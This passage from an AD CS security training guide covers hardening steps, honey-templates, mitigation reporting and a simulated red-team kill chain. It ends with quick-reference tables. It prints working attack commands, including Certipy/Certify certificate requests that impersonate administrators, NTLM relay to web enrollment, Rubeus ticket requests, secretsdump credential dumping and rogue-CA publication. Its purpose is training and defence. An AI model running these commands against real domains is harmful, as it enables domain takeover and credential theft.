- `PA-PK-AS-REQ` pre-auth data type (padata-type 16)
- `AuthPack` ASN.1 structure: pkAuthenticator + clientPublicValue
- CMS `SignedData` structure wrapping AuthPack
- Client certificate embedded in `SignedData.certificates`
- DH key exchange: client DH public value + KDC DH public value → shared secret
- `PA-PK-AS-REP` structure: KDC's DH response
- `KDCDHKeyInfo` — KDC's DH public key
- Wireshark dissector: `kerberos` protocol, `AS-REQ`/`AS-REP` message types
- `openssl asn1parse` on raw packet bytes for manual inspection

**Key Commands:**
```bash
# Capture PKINIT traffic
wireshark &
# Filter: kerberos.msg_type == 10 (AS-REQ) || kerberos.msg_type == 11 (AS-REP)
# Export specific packet bytes → inspect with asn1parse
openssl asn1parse -inform DER -in pkinit_padata.der
```

---

### Step 46 — Implement AD CS Hardening

**Description:**
Apply comprehensive AD CS hardening to your lab, then document each control as a practical remediation recommendation. Priority controls: (1) Disable HTTP on Web Enrollment — require HTTPS + EPA; (2) Enable Extended Protection for Authentication (EPA) on IIS Web Enrollment; (3) Disable `EDITF_ATTRIBUTESUBJECTALTNAME2` if enabled; (4) Remove `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` from all templates that don't strictly require it; (5) Enable CA audit logging for all certificate operations; (6) Set `StrongCertificateBindingEnforcement = 2` on all DCs; (7) Restrict enrollment rights — remove `Authenticated Users`/`Domain Users` where not needed.

**Key Concepts:**
- Extended Protection for Authentication (EPA) — binds NTLM to TLS channel (defeats ESC8)
- `EDITF_ATTRIBUTESUBJECTALTNAME2` removal: `certutil -setreg CA\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2`
- Template hardening: remove `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` via ADSI Edit or Certipy
- CA audit logging: enable all audit categories in `certsrv.msc` → Properties → Auditing
- `StrongCertificateBindingEnforcement = 2` on all DCs (full enforcement)
- Disable unused CA roles: Web Enrollment, NDES if not needed
- TLS 1.2+ only on all CA interfaces; disable legacy SSL/TLS versions
- CRL publishing frequency: reduce `nextUpdate` window to limit revocation lag
- Privileged Access Workstation (PAW) for CA administration
- Tier-0 treatment of CA servers and CA administrators

**Key Commands:**
```bash
# Disable EDITF_ATTRIBUTESUBJECTALTNAME2
certutil -setreg CA\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
Restart-Service certsvc

# Enable EPA on IIS (Web Enrollment)
# IIS Manager → Authentication → Windows Authentication → Advanced Settings → Extended Protection: Required

# Set enforcement mode on DC
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Kdc" /v StrongCertificateBindingEnforcement /t REG_DWORD /d 2 /f
```

---

### Step 47 — Deploy Strong Template ACLs

**Description:**
Template ACL hardening is the most impactful single remediation for ESC1–ESC4. Replace broad enrollment rights on sensitive templates with explicit, minimized tier-based security groups. Best practices: (1) Create dedicated security groups per template (e.g., `SG-Enroll-SmartcardUser`); (2) Remove `Authenticated Users`, `Domain Users`, and `Everyone` from all template enrollment ACEs; (3) Audit all templates using Certipy and remove `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` unless strictly required; (4) Apply `Deny` ACEs for high-risk groups on sensitive templates; (5) Use GPO to manage certificate autoenrollment via dedicated groups.

**Key Concepts:**
- Template enrollment ACE: `Certificate-Enrollment` extended right (GUID: `0e10c968-78fb-11d2-90d4-00c04f79dc55`)
- Template autoenrollment ACE: `Certificate-AutoEnrollment` extended right
- Removing `Authenticated Users` from template enrollment ACL
- Dedicated per-template enrollment security groups
- `certtmpl.msc` → template → Security tab for ACL management
- `dsacls` command-line tool for AD ACL management
- PowerShell: `Set-Acl` on AD template objects
- `Read` permission: required for enrollment (separate from `Enroll`)
- Least-privilege principle: only accounts that legitimately need each template can enroll
- Periodic access review: quarterly review of template enrollment ACLs

---

### Step 48 — Construct Honey-Templates

**Description:**
Honey-templates are deceptively attractive certificate templates designed to alert defenders when an attacker attempts to enumerate or enroll. Create templates named with high-value strings (e.g., `DomainAdmin-Smartcard`, `PrivilegedAccess-Cert`) with ESC1 indicators visible in LDAP — but either disabled (not published to any CA) or configured to require approval and log all requests. Any enrollment attempt is a high-confidence attacker indicator. Combine with audit logging and SIEM alerting on Event ID 4886 (request received) for these template names.

**Key Concepts:**
- Honey-template design: attractive names, visible misconfiguration indicators
- Disabled publication: template exists in AD but not published to any CA
- Approval requirement: all requests go to pending — triggers alert
- Audit logging: 4886 event on any request against honey-template
- SIEM rule: `EventID=4886 AND TemplateName IN ("DomainAdmin-*","Priv*")`
- Canary objects in AD: similar concept to honeypots
- Logging completeness: CA audit logging must be enabled for this to work
- False positive risk: legitimate users confused by attractive template names (use non-obvious names internally)
- Integration with SOAR for automated response to honey-template hits

---

### Step 49 — Write Professional-Grade Mitigation Reports

**Description:**
Translate complex AD CS exploitation chains into structured, business-ready remediation documentation suitable for CISO, security engineering, and system administrator audiences. Each finding should include: executive summary (business risk in non-technical language), technical description (precise vulnerability mechanics), reproduction steps (for internal validation), CVSS v3.1 score with vector string, affected assets (CA names, template names), remediation steps (specific GPO, registry, and ACL changes with commands), and verification procedure (how to confirm the fix worked). Reference SpecterOps research and Microsoft KB articles for authority.

**Key Concepts:**
- CVSS v3.1 scoring for AD CS vulnerabilities
  - ESC1: CVSS 9.8 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H) typical
- Affected asset enumeration: CA server name, template name, affected users
- Microsoft KB references: KB5014754 (strong mapping), KB5005413 (PetitPotam)
- SpecterOps research: "Certified Pre-Owned" whitepaper (June 2021)
- Risk rating tiers: Critical / High / Medium / Low
- Remediation priority matrix: effort vs. risk reduction
- Before/after Certipy output as evidence of fix
- Executive summary: "An attacker with any domain account can obtain a certificate impersonating any employee including administrators"
- Technical annex: raw Certipy output, exploitation proof screenshots
- SLA recommendations: Critical findings patched within 24–72 hours

---

### Step 50 — Simulate Full-Scope Active Directory Engagements

**Description:**
Combine all phases into an end-to-end simulated red team engagement in your hardened lab. Scenario: you have phished a standard domain user (no admin rights). Execute the full kill chain: LDAP reconnaissance → Certipy enumeration → ESC1 certificate request → PKINIT Administrator → DCSync → `krbtgt` hash → Golden Ticket. Then layer in complexity: domain environment with EDR simulation, template ACLs tightened, EPA enabled (forcing ESC8 bypass), requiring ESC7→ESC6 chaining. Document detection opportunities at each phase, write detections for each step, and measure dwell time from initial access to DA.

**Key Concepts:**
- Full kill chain: Phish → Recon → ESC exploitation → PKINIT → DCSync → Persistence
- Assumed breach starting point: standard domain user credentials
- EDR simulation: Windows Defender, AMSI, PowerShell Constrained Language Mode
- Detection measurement: which steps generate Event IDs / SIEM alerts
- Dwell time measurement: time from credential to Domain Admin
- Purple team exercise: defender monitors while attacker executes
- MITRE ATT&CK mapping: T1649 (Steal or Forge Authentication Certificates)
- T1550.001 (Use Alternate Authentication Material: Pass the Hash)
- T1003.003 (OS Credential Dumping: NTDS)
- Remediation validation: re-run Certipy after each fix to confirm closure
- Final deliverable: full engagement report with timeline, findings, and fixes

---

## Quick Reference — ESC Vulnerability Summary

| ESC | Name | Core Condition | Exploitation Method |
|-----|------|----------------|---------------------|
| ESC1 | Enrollee Supplies Subject | `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` + Auth EKU + low-priv enroll | Inject admin UPN into SAN during cert request |
| ESC2 | Any Purpose EKU | Any Purpose / No EKU on template | Use as ESC1 (if SAN supply allowed) or ESC3 agent |
| ESC3 | Enrollment Agent | Certificate Request Agent EKU obtainable | Two-stage: get agent cert → enroll on behalf of admin |
| ESC4 | Template ACL Abuse | WriteDacl/WriteOwner/GenericWrite on template object | Modify template to ESC1 conditions, exploit, restore |
| ESC5 | PKI Object ACL Abuse | Write access on PKI AD objects (NTAuthCerts, containers) | Add rogue CA to NTAuthCerts or modify CA objects |
| ESC6 | CA Flag Abuse | `EDITF_ATTRIBUTESUBJECTALTNAME2` enabled on CA | Inject SAN in any auth-EKU template request |
| ESC7 | CA Admin/Officer Rights | `ManageCA` or `ManageCertificates` rights on CA | Enable ESC6 flag (ManageCA) or approve own request (Officer) |
| ESC8 | NTLM Relay to Web Enroll | Web Enrollment on HTTP without EPA | Relay DC NTLM auth to `/certsrv/` to get DC machine cert |
| ESC9 | No Security Extension | Template has `CT_FLAG_NO_SECURITY_EXTENSION` flag | Cert issued without SID extension, bypasses strong mapping |
| ESC10 | Weak Certificate Mapping | `CertificateMappingMethods` allows weak mapping | Certificate-to-account mapping bypass on DC |

---

## Quick Reference — Critical Tool Commands

```bash
# === CERTIPY ===
certipy find -u user@domain.local -p pass -dc-ip IP -vulnerable -text
certipy req  -u user@domain.local -p pass -ca CA-Name -template TemplateName -upn admin@domain.local -dc-ip IP
certipy auth -pfx admin.pfx -dc-ip IP -username administrator -domain domain.local
certipy ca   -u officer@domain.local -p pass -ca CA-Name -enable-userspecifiedsan -dc-ip IP
certipy ca   -u officer@domain.local -p pass -ca CA-Name -issue-request <ID> -dc-ip IP
certipy relay -target http://ca-server/certsrv/certfnsh.asp -template DomainController

# === CERTIFY (Windows) ===
Certify.exe find /vulnerable
Certify.exe find /enrolleeSuppliesSubject
Certify.exe request /ca:"CA-Server\CA-Name" /template:"TemplateName" /altname:"administrator"
Certify.exe cas

# === RUBEUS (Windows) ===
Rubeus.exe asktgt /certificate:<base64pfx> /password:<pfxpass> /domain:domain.local /dc:IP /ptt
Rubeus.exe s4u /impersonateuser:administrator /self /ticket:<base64tgt>

# === IMPACKET ===
impacket-ntlmrelayx -t http://ca-server/certsrv/certfnsh.asp --adcs --template DomainController -smb2support
impacket-secretsdump -hashes ':NTLMhash' domain.local/administrator@DC-IP
impacket-secretsdump -hashes ':NTLMhash' -just-dc domain.local/DC$@DC-IP

# === OPENSSL ===
openssl x509 -in cert.pem -noout -text
openssl pkcs12 -export -out cert.pfx -inkey key.pem -in cert.pem
openssl pkcs12 -in cert.pfx -nocerts -out key.pem
openssl asn1parse -in cert.pem

# === CERTUTIL (Windows) ===
certutil -dump cert.pfx
certutil -getreg CA\EditFlags
certutil -getreg CA\InterfaceFlags
certutil -catemplates
certutil -v -template TemplateName
certutil -setreg CA\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
certutil -dspublish -f rogue.crt NTAuthCA
```

---

## Critical Event IDs for Detection

| Event ID | Source | Description |
|----------|--------|-------------|
| 4886 | CA Server | Certificate request received |
| 4887 | CA Server | Certificate issued (includes requester, template, SAN) |
| 4888 | CA Server | Certificate request denied |
| 4768 | DC | Kerberos TGT request (pre-auth type 16 = PKINIT) |
| 4769 | DC | Kerberos service ticket request |
| 5136 | DC | AD object attribute modified (template changes = ESC4) |
| 4662 | DC | AD object access operation |
| 4624 | Any | Account logon (correlate with PKINIT TGT) |

---

## Key References

- **SpecterOps "Certified Pre-Owned"** — Will Schroeder & Lee Christensen (June 2021) — foundational ESC1–ESC8 research
- **Microsoft KB5014754** — Strong certificate mapping update (May 2022)
- **RFC 4556** — PKINIT (Public Key Cryptography for Initial Authentication in Kerberos)
- **RFC 5280** — Internet X.509 PKI Certificate and CRL Profile
- **MITRE ATT&CK T1649** — Steal or Forge Authentication Certificates
- **Certipy GitHub** — https://github.com/ly4k/Certipy
- **Certify GitHub** — https://github.com/GhostPack/Certify
- **Impacket GitHub** — https://github.com/SecureAuthCorp/impacket
- **BloodHound GitHub** — https://github.com/BloodHoundAD/BloodHound
